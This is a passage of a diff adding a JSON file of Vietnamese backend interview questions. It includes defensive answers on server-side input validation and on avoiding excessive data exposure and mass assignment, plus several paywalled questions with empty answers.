+        "Kiểm cả ràng buộc nghiệp vụ, không chỉ hình dạng dữ liệu: giá lấy từ DB chứ không nhận từ client, số lượng không vượt tồn kho, orderId phải thuộc về user đang đăng nhập.",
+        "Validate ở biên của mỗi service — dữ liệu từ service nội bộ, message queue, webhook cũng là đầu vào không tin cậy."
+      ],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "TS",
+          "code": "const Body = z.object({\n  quantity: z.number().int().min(1).max(50),\n  couponCode: z.string().regex(/^[A-Z0-9]{4,16}$/).optional(),\n}).strict() // reject unknown keys\n\nconst input = Body.parse(await req.json())"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 29,
+    "sourceSlug": "98657-frontend-da-validate-form-bang-zod-roi-backend-con-can-validate-lai-khong-valida"
+  },
+  {
+    "id": "2e14c7f8-a8a0-50a4-a579-e10e01f3343f",
+    "question": "Endpoint GET /users/:id trả nguyên record từ ORM. Vấn đề ở đâu, kể cả khi UI không hiển thị các trường thừa?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98658-endpoint-get-users-id-tra-nguyen-record-tu-orm-van-de-o-dau-ke-ca-khi-ui-khong-h",
+    "slug": "endpoint-get-users-id-tra-nguyen-record-tu-orm-van-de-o-dau-ke-ca-khi-ui-khong-hien-thi-cac-truong-t-2e14c7f8-a8a0-50a4-a579-e10e01f3343f",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Đây là excessive data exposure: API trả tất cả những gì có rồi để client tự chọn hiển thị. Nhưng client không phải nơi giấu dữ liệu — mở tab Network là thấy toàn bộ response.",
+        "Chiều ngược lại của cùng một lỗi là mass assignment: nhận nguyên body rồi update(body), cho phép client tự set role: 'admin'. Cả hai đều được chữa bằng cùng một nguyên tắc — khai báo tường minh trường vào và trường ra, không bao giờ đi đường tắt cả object."
+      ],
+      "details": [
+        "Trả thẳng entity ORM thường kéo theo password_hash, reset_token, email của người khác, internal_note, is_admin, cùng mọi cột mới thêm sau này — hôm nay ai đó thêm national_id vào bảng thì nó tự động lộ ra API mà không ai review.",
+        "Cách xử lý:\n- Serializer / DTO theo allowlist: định nghĩa rõ trường nào ra ngoài, thay vì loại trừ trường nhạy cảm (danh sách loại trừ luôn quên cái mới)."
+      ],
+      "points": [
+        "select ở tầng query để dữ liệu nhạy cảm không rời khỏi DB — vừa an toàn vừa nhẹ.",
+        "Khác nhau theo người xem: chính chủ thấy email, người lạ thì không. Đây là phân quyền ở mức thuộc tính, không chỉ mức object.",
+        "Có test chặn hồi quy: snapshot khoá hình dạng response, thêm cột mới mà quên khai báo thì test đỏ."
+      ],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "TS",
+          "code": "const publicUser = (u: User) => ({ id: u.id, name: u.name, avatarUrl: u.avatarUrl })"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 30,
+    "sourceSlug": "98658-endpoint-get-users-id-tra-nguyen-record-tu-orm-van-de-o-dau-ke-ca-khi-ui-khong-h"
+  },
+  {
+    "id": "373cb0bd-492e-51a6-adc0-cee7674729ac",
+    "question": "Cursor pagination: cursor nên chứa gì, và xử lý thế nào khi dữ liệu bị chèn/xoá lúc client đang duyệt?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "cursor-pagination-cursor-nen-chua-gi-va-xu-ly-the-nao-khi-du-lieu-bi-chen-xoa-luc-client-dang-duyet-373cb0bd-492e-51a6-adc0-cee7674729ac",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 31,
+    "sourceSlug": null
+  },
+  {
+    "id": "bc5a80ff-d172-5499-b0aa-009872d4cf51",
+    "question": "Hai người cùng sửa một bản ghi, người sau ghi đè mất thay đổi của người trước. Dùng ETag và If-Match xử lý thế nào?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "hai-nguoi-cung-sua-mot-ban-ghi-nguoi-sau-ghi-de-mat-thay-doi-cua-nguoi-truoc-dung-etag-va-if-match-x-bc5a80ff-d172-5499-b0aa-009872d4cf51",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 32,
+    "sourceSlug": null
+  },
+  {
+    "id": "72206b21-c40b-53a7-bda6-6469c6218cb8",
+    "question": "Em thiết kế hệ thống gửi webhook cho đối tác thế nào? Xử lý retry, ký chữ ký và chống replay ra sao?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "em-thiet-ke-he-thong-gui-webhook-cho-doi-tac-the-nao-xu-ly-retry-ky-chu-ky-va-chong-replay-ra-sao-72206b21-c40b-53a7-bda6-6469c6218cb8",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 33,
+    "sourceSlug": null
+  },
+  {
+    "id": "9a95e548-be6b-5a61-9227-00d1067b4a87",
+    "question": "Client gọi service khác bị timeout thì retry thế nào cho đúng? Đặt timeout bao nhiêu?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "client-goi-service-khac-bi-timeout-thi-retry-the-nao-cho-dung-dat-timeout-bao-nhieu-9a95e548-be6b-5a61-9227-00d1067b4a87",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 34,
+    "sourceSlug": null
+  },
+  {
+    "id": "ff901906-bf55-5833-a103-ee12774fc8cc",
+    "question": "Cần đổi schema response mà không được phá client cũ (mobile app không ép update được). Em làm thế nào và kiểm soát breaking change ra sao?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "can-doi-schema-response-ma-khong-duoc-pha-client-cu-mobile-app-khong-ep-update-duoc-em-lam-the-nao-v-ff901906-bf55-5833-a103-ee12774fc8cc",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 35,
+    "sourceSlug": null
+  },
+  {
+    "id": "e5d8a00f-b719-54e7-86f6-22c15839a797",
+    "question": "Triển khai transactional outbox ở production thế nào? Polling publisher hay CDC?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "trien-khai-transactional-outbox-o-production-the-nao-polling-publisher-hay-cdc-e5d8a00f-b719-54e7-86f6-22c15839a797",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 36,
+    "sourceSlug": null
+  },
+  {
+    "id": "b4f550fb-67c1-5c41-bb65-e62f108336f7",
+    "question": "Trong saga, bước sau lỗi thì bù trừ (compensation) thế nào? Nếu chính bước bù trừ cũng lỗi thì sao?",
+    "level": "advanced",
+    "levelLabel": "NÂNG CAO",
+    "sourceUrl": null,
+    "slug": "trong-saga-buoc-sau-loi-thi-bu-tru-compensation-the-nao-neu-chinh-buoc-bu-tru-cung-loi-thi-sao-b4f550fb-67c1-5c41-bb65-e62f108336f7",
+    "access": "pro",
+    "upgrade": {
+      "message": "Nâng cấp Pro mở trọn bộ tính năng",
+      "url": "https://luyenphongvan.online/checkout?plan=monthly",
+      "cta": "Pro — 49k/tháng"
+    },
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [],
+      "details": [],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 37,
+    "sourceSlug": null
+  }
+]
